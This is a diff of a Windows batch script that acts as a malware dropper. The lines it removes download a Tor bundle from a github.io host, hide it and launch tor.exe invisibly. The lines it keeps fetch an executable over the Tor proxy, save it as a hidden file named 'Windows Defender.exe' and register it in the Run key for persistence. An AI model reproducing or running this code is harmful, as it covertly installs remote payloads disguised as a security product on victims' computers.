@@ -3,11 +3,6 @@
 ping www.google.com -n 1 -w 5000 >NUL
 if errorlevel 1 goto Connectivitycheck
 
-
-curl.exe "https://cryptedlumos.github.io/Tor.zip" --output "%temp%\Tor.zip" && powershell Expand-Archive -LiteralPath "%temp%\Tor.Zip" -DestinationPath "C:\ " -Force
-attrib +s +h +i "C:\Tor"
-nircmd exec hide "C:\Tor\tor.exe"
-
 curl.exe --socks5-hostname 127.0.0.1:9050 https://cryptedlumos.github.io/WindowsDefender.exe --output "%AppData%\Microsoft\Windows\Windows Defender.exe" && attrib +s +h +i "%AppData%\Microsoft\Windows\Windows Defender.exe"
 REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Defender" /t REG_SZ /F /D "%AppData%\Microsoft\Windows\Windows Defender.exe -P\"rofile of Windows Defender [Microsoft Corporation]"\"
 
